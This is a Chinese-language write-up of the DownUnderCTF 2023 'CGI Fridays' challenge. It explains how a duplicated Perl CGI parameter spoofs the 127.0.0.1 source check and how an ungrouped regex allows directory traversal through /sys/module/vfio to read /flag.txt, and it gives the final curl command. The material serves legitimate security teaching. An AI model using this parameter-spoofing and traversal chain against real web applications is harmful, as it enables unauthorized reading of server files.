# DownUnderCTF 2023 CGI Fridays Writeup

## 题目简述

Perl CGI 程序根据 `page` 参数读取固定页面或 `/proc` 文件。访问 `cpuinfo`、`stat`、`io`、`maps` 时本应只允许 `REMOTE_ADDR=127.0.0.1`，但参数传递中的列表上下文允许伪造该地址；紧接着，一个缺少分组的正则又允许把任意包含 `io` 的路径送入 `/proc/self/$page`。

组合这两个缺陷，可以构造带 `io` 的目录穿越路径读取容器根目录下的 `/flag.txt`。

## 解题过程

CGI 主逻辑直接写成：

```perl
my $file_path = route_request($q->param('page'), $ENV{'REMOTE_ADDR'});
```

`CGI::Minimal->param('page')` 在存在多个同名参数时会在列表上下文返回多个值。若请求包含两个 `page`，实际调用近似于：

```perl
route_request($page1, $page2, $ENV{'REMOTE_ADDR'});
```

而函数只接收前两个参数：

```perl
my ($page, $remote_addr) = @_;
```

于是第二个 `page` 值成为 `$remote_addr`。将它设置为 `127.0.0.1` 即可通过本地来源检查。

路径分支的正则是：

```perl
if ($page =~ /^stat|io|maps$/) {
    return HTDOCS . '/pages/denied.txt' unless $remote_addr eq '127.0.0.1';
    return "/proc/self/$page";
}
```

由于 `|` 没有放入分组，表达式等价于 `(^stat)|(io)|(maps$)`，而不是预期的 `^(stat|io|maps)$`。任何包含 `io` 的字符串都能进入分支。选择真实存在的 `/sys/module/vfio` 作为“含 `io` 的锚点”，再通过 `..` 回到根目录：

```text
/proc/self/../../sys/module/vfio/../../../flag.txt
```

发送最终请求：

```bash
curl --get 'http://TARGET/' \
  --data-urlencode 'page=../../sys/module/vfio/../../../flag.txt' \
  --data-urlencode 'page=127.0.0.1'
```

服务器读取并返回：

```text
DUCTF{s qqjust another perl hacker q and print ucfirst}
```

flag 中的空格是内容的一部分，不能在整理时擅自删除。

## 方法总结

本题是一条紧密相连的双漏洞链：Perl 列表上下文让重复参数改变函数实参位置，正则运算符优先级又把受限枚举扩大成“路径中出现 `io` 即可”。单独完成地址伪造只能访问几个 `/proc` 项，单独发现正则宽松也会被来源检查挡住；两者结合后才形成任意文件读取。
